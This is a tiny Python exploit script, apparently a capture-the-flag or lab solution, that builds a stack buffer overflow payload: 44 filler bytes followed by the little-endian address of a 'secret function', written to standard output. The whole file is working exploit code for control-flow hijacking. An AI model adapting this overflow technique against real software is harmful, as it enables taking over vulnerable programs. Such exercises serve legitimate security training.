# 080491a6 address of secret function
import sys

payload = b"a" * 32 + b"bbbbccccdddd"
payload += b"\x08\x04\x91\xa6"[::-1]
sys.stdout.buffer.write(payload)
